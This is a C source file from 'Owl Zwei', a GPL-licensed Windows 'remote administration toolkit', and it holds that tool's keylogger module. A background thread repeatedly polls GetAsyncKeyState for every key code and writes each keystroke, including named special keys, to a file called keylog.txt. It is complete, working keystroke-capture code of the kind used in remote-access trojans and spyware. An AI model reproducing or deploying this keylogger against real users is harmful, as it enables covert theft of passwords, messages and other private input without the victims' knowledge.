/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * 
 *   Owl Zwei - Remote Administration Toolkit For Windows                    *
 *                                                                           * 
 *   Copyright 2010 Yati Sagade                                              *
 *                                                                           *
 *   This file is part of Owl Zwei.                                          *
 *                                                                           *
 *   Owl Zwei is free software: you can redistribute it and/or modify        *
 *   it under the terms of the GNU General Public License as published by    *
 *   the Free Software Foundation, either version 3 of the License, or       *
 *   (at your option) any later version.                                     *
 *                                                                           *
 *   Owl Zwei is distributed in the hope that it will be useful,             *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of          *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           *
 *   GNU General Public License for more details.                            *
 *                                                                           *
 *   You should have received a copy of the GNU General Public License       *
 *   along with Owl Zwei.  If not, see <http://www.gnu.org/licenses/>.       *
 *                                                                           *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
#include "keyboard.h"
/*****************************************************************************************/
bool  bCtrlKeyLog;
const char szShfKeys[] = "~!@#$%^&*()_+{}|:\"<>\?QWERTYUIOPASDFGHJKLZXCVBNM";
/*****************************************************************************************/
void KeyLog( bool start ){
	if( start && !bCtrlKeyLog ){
		bCtrlKeyLog = true;
		new_thread( keyLogProc , NULL );
	}else if( !start )
		bCtrlKeyLog = false;
}
/*****************************************************************************************/
DWORD WINAPI keyLogProc( LPVOID ptr ){
	register int i;

	FILE *fp = fopen( "keylog.txt" , "w" );

	while( bCtrlKeyLog ){

		for( i = 8 ; i < 256 ; i++ ){

			if( GetAsyncKeyState( i ) == -32767 )
				LogChar( i , fp );

		}
	}
	fclose(fp);
	return 0;

}
/*****************************************************************************************/
void LogChar( int c , FILE *fp ){

	if( ( c >= 0x41 ) && ( c < 0x5a ) )
		fputc( (c + 32) , fp );
	else if( c >= 0x30 && c <= 0x39 )
		fputc( ((c - 0x30) + '0') , fp );
	else{
		char *str;
		switch(c){
		case VK_BACK : str = "[BACK]";break;
		case VK_TAB: str = "[TAB]";break;
		case VK_RETURN: str = "[RETURN]";break;
		case VK_SHIFT : str = "[SHIFT]";break;
		case VK_CONTROL: str = "[CTRL]";break;
		case VK_MENU: str = "[ALT]";break;
		case VK_CAPITAL: str = "[CAPS]";break;
		case VK_SPACE: str = "[SPACE]";break;
		case VK_PRIOR: str = "[PGUP]";break;
		case VK_NEXT: str = "[PGDN]";break;
		case VK_END: str = "[END]";break;
		case VK_HOME: str = "[HOME]";break;
		case VK_LEFT: str = "[LEFT]";break;
		case VK_UP: str = "[UP]";break;
		case VK_RIGHT: str = "[RIGHT]";break;
		case VK_DOWN: str = "[DOWN]";break;
		case VK_DELETE: str = "[DEL]";break;
		case VK_NUMPAD0: str = "[NM0]";break;
		case VK_NUMPAD1: str = "[NM1]";break;
		case VK_NUMPAD2: str = "[NM2]";break;
		case VK_NUMPAD3:  str = "[NM3]";break;
		case VK_NUMPAD4: str = "[NM4]";break;
		case VK_NUMPAD5: str = "[NM5]";break;
		case VK_NUMPAD6: str = "[NM6]";break;
		case VK_NUMPAD7: str = "[NM7]";break;
		case VK_NUMPAD8: str = "[NM8]";break;
		case VK_NUMPAD9: str = "[NM9]";break;
		case VK_MULTIPLY: str = "[MUL]";break;
		case VK_ADD: str = "[ADD]";break;
		case VK_SUBTRACT: str = "[SUB]";break;
		case VK_DECIMAL: str = "[DECIMAL]";break;
		case VK_DIVIDE: str = "[DIV]";break;
		case VK_F1:  str = "[F1]";break;
		case VK_F2:  str = "[F2]";break;
		case VK_F3:  str = "[F3]";break;
		case VK_F4:  str = "[F4]";break;
		case VK_F5:  str = "[F5]";break;
		case VK_F6:  str = "[F6]";break;
		case VK_F7:  str = "[F7]";break;
		case VK_F8:  str = "[F8]";break;
		case VK_F9:  str = "[F9]";break;
		case VK_F10: str = "[F10]";break;
		case VK_F11: str = "[F11]";break;
		case VK_F12: str = "[F12]";break;
		case VK_F13: str = "[F13]";break;
		case VK_F14: str = "[F14]";break;
		case VK_F15: str = "[F15]";break;
		case VK_F16: str = "[F16]";break;
		case VK_F17: str = "[F17]";break;
		case VK_F18: str = "[F18]";break;
		case VK_F19: str = "[F19]";break;
		case VK_F20: str = "[F20]";break;
		case VK_F21: str = "[F21]";break;
		case VK_F22: str = "[F22]";break;
		case VK_F23: str = "[F23]";break;
		case VK_F24: str = "[F24]";break;
		case 0xbb: str = "+";break;
		case 0xbc : str = ",";break;
		case 0xbd: str = "-";break;
		case 0xbe: str = ".";break;
		case 0xc0: str = "[`~]";break;
		case 0xbf: str = "[/?]";break;
		case 0xdb: str = "[[{]";break;
		case 0xdc: str = "[\\|]";break;
		case 0xdd: str = "[]}]";break;
		case 0xde: str = "[\'\"]";break;
		default: str = "";
		}
		fprintf( fp , "%s" , str );
	}
	fputc(' ',fp);
	char s[2] = {c,'\0'};
    //MessageBox(0,s,"",MB_OK);

}
/*****************************************************************************************/

	
						
